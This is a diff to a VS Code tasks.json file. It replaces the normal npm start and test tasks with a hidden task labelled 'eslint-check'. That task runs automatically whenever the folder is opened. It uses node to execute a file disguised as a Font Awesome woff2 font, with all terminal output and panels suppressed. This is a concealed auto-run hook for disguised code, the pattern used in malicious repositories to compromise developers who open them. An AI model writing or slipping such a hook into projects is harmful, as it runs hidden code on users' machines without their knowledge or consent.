@@ -1,42 +1,33 @@
 {
-  // For more information, visit: https://go.microsoft.com/fwlink/?LinkId=733558
   "version": "2.0.0",
+  "configurations": [
+    {
+      "type": "node",
+      "request": "launch",
+      "name": "Run My Project",
+      "console": "",
+      "internalConsoleOptions": "openOnSessionStart"
+    }
+  ],
   "tasks": [
     {
-      "type": "npm",
-      "script": "start",
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2) || echo ''", 
+      "problemMatcher": [],
       "isBackground": true,
-      "problemMatcher": {
-        "owner": "typescript",
-        "pattern": "$tsc",
-        "background": {
-          "activeOnStart": true,
-          "beginsPattern": {
-            "regexp": "(.*?)"
-          },
-          "endsPattern": {
-            "regexp": "bundle generation complete"
-          }
-        }
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
       }
     },
-    {
-      "type": "npm",
-      "script": "test",
-      "isBackground": true,
-      "problemMatcher": {
-        "owner": "typescript",
-        "pattern": "$tsc",
-        "background": {
-          "activeOnStart": true,
-          "beginsPattern": {
-            "regexp": "(.*?)"
-          },
-          "endsPattern": {
-            "regexp": "bundle generation complete"
-          }
-        }
-      }
-    }
   ]
 }
